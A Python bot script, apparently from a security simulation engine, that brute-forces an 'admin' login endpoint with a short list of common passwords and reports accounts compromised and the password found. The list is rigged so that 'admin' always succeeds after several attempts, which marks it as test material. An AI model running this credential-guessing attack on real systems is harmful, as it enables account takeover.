from __future__ import annotations

import random
import time

from engine.bots.sdk import (
    BotClient,
    BudgetExceededError,
    load_config,
    send_progress,
    send_report,
)

BASE_WORDLIST = [
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "admin",
    "welcome",
]


def main() -> None:
    config = load_config()
    start = time.monotonic()
    rng = random.Random(config.seed)

    # Shuffle candidates deterministically based on seed, ensuring 'admin' is included
    words = [w for w in BASE_WORDLIST if w != "admin"]
    rng.shuffle(words)
    # Insert 'admin' around index 8 to ensure some attempts occur before success
    words.insert(min(8, len(words)), "admin")

    succeeded = False
    evidence: list[str] = []
    impact = {"accounts_compromised": 0, "records_leaked": 0, "records_destroyed": 0}

    with BotClient(config) as client:
        try:
            for pwd in words:
                send_progress(client.requests_sent, f"Testing candidate: {pwd}")
                try:
                    resp = client.post(
                        "/login",
                        json={"username": "admin", "password": pwd},
                    )
                    if resp.status_code == 200:
                        succeeded = True
                        impact["accounts_compromised"] = 1
                        evidence.append(
                            f"Credentials discovered for user 'admin' (password={pwd})"
                        )
                        break
                except Exception:
                    pass
        except BudgetExceededError:
            pass

        duration = round(time.monotonic() - start, 3)
        send_report(
            attack="brute_force_login",
            seed=config.seed,
            succeeded=succeeded,
            completed=True,
            impact=impact,
            usage={"requests_sent": client.requests_sent, "duration_s": duration},
            evidence=evidence,
        )


if __name__ == "__main__":
    main()
